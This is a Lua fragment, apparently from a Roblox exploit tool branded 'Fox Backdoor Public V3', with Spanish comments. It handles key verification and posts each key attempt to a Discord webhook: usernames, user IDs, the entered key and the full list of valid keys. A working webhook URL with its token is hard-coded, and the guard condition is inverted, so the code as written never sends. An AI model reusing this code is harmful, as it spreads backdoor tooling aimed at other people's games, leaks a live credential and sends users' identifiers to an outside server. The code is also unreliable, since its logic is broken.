-- Función para enviar a Discord
local function sendToDiscord(title, description, color, fields)
    if not LOG_TO_DISCORD or DISCORD_WEBHOOK_URL == " https://discord.com/api/webhooks/1475317753501188218/Mi6tPTEg7SW9f4n0KlakH9Bs3YpgSWnqs7Qb2xl0Ln7zZJDPHUhPhgFe1jWuVxxRRkN_" then 
        return 
    end
    
    local data = {
        ["embeds"] = {{
            ["title"] = title,
            ["description"] = description,
            ["color"] = color,
            ["fields"] = fields or {},
            ["footer"] = {
                ["text"] = "Fox Backdoor Public V3 • " .. os.date("%H:%M:%S"),
                ["icon_url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LP.UserId .. "&width=420&height=420&format=png"
            },
            ["timestamp"] = DateTime.now():ToIsoDate()
        }}
    }
    
    local success, response = pcall(function()
        HttpService:PostAsync(DISCORD_WEBHOOK_URL, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
    end)
    
    if not success then
        warn("Error enviando a Discord:", response)
    end
end

-- Función para loguear intentos de key
local function logKeyAttempt(key, usuario, exitoso)
    if not LOG_TO_DISCORD then return end
    
    local color = exitoso and 65280 or 16711680
    local titulo = exitoso and "✅ Key Correcta - Acceso Concedido" or "❌ Key Incorrecta - Intento Fallido"
    
    -- Crear lista de keys válidas para el log
    local keysList = ""
    for k, _ in pairs(KEYS_VALIDAS) do
        keysList = keysList .. "• " .. k .. "\n"
    end
    
    sendToDiscord(
        titulo,
        "**Usuario:** " .. usuario,
        color,
        {
            {
                ["name"] = "👤 Usuario",
                ["value"] = usuario .. " (`" .. LP.UserId .. "`)",
                ["inline"] = true
            },
            {
                ["name"] = "🔑 Key ingresada",
                ["value"] = "`" .. key .. "`",
                ["inline"] = true
            },
            {
                ["name"] = "📊 Resultado",
                ["value"] = exitoso and "✅ ACEPTADO" or "❌ RECHAZADO",
                ["inline"] = true
            },
            {
                ["name"] = "📋 Keys válidas",
                ["value"] = keysList,
                ["inline"] = false
            }
        }
    )
end

-- Función de verificación
local function verificarKey(key)
    -- Limpiar espacios al inicio y final
    key = key:gsub("^%s+", ""):gsub("%s+$", "")
    
    -- Verificar si la key existe en la lista
    return KEYS_VALIDAS[key] == true
end

